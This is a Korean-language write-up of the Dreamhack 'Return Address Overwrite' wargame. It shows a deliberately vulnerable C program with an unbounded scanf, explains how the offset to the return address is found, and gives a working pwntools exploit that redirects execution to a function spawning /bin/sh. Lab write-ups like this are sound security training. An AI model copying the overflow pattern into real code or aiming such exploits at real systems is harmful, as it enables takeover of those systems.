---
title: "[Dreamhack] Return Address Overwrite Write up"
author: d0razi
date: 2023-08-14 16:30
categories: [InfoSec, Pwn]
tags: [linux, Dreamhack]
toc: false
image: /assets/img/media/banner/dreamhack.jpg
---

# C 코드

```c
// Name: rao.c
// Compile: gcc -o rao rao.c -fno-stack-protector -no-pie

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

void get_shell() {
  char *cmd = "/bin/sh";
  char *args[] = {cmd, NULL};

  execve(cmd, args, NULL);
}

int main() {
  char buf[0x28];

  init();

  printf("Input: ");
  scanf("%s", buf);

  return 0;
}
```

메인함수 scanf에서 버퍼오버플로우를 발생시켜서 return 값을 get_shell함수의 주소로 덮어버리면 쉘을 딸수있을꺼같다.

---

# 파일 분석

우리가 디버깅을 하면서 알아내야 하는 정보를 정리해보자

- buf에서 EBP까지의 거리
- get_shell 함수의 주소

디버깅은 peda를 사용했습니다.

![어셈블리어 코드](/assets/img/media/post_img/dreamhack/RAO/Untitled.png)

어셈블리어 코드

위 코드에서 35번째 줄을 보면 buf는 rbp에서 0x30만큼 떨어져있는걸 알수있다.

이제 현재 스택 구조를 생각해보면 아래 그림처럼 되어있다고 생각할수있다.

![출처: 드림핵](/assets/img/media/post_img/dreamhack/RAO/Untitled%201.png)

출처: 드림핵

입력을할때 0x30만큼 더미데이터를 입력하면 SFP에도달할수있고 0x8만큼 추가로 입력하면 Return주소에 도달할수있다.

그러면 0x30+0x8만큼 더미를 입력하고 get_shell의 주소를 입력해주면 쉘을 딸수있다.

- buf ↔ rbp : 0x30
- get_shell의 주소는 pwntools사용하여 얻을것이다.

이제 모든 정보를 얻었으니 익스플로잇 코드를 짜보자.

---

# Exploit

```python
from pwn import *
 
#p=remote("host3.dreamhack.games",12778)
 
p = process('./rao')
e = ELF("rao") #get_shell함수의 주소를 얻기위한 함수를 쓰기위해 실행파일 선택
 
shell_addr = e.symbols["get_shell"] #e.symbols["함수명"] 이함수는 괄호안에 함수의 베이스주소를 가져온다.
 
pay = b'A'*0x30 #버퍼부터 rbp까지 오프셋
 
pay += b'A'*8 #SFP만큼 8바이트 추가
 
pay += p64(shell_addr)
 
p.recv() #input: 제거
p.sendline(pay)
p.interactive()
```

![Untitled](/assets/img/media/post_img/dreamhack/RAO/Untitled%202.png)

쉘이 따진 걸 볼 수 있다.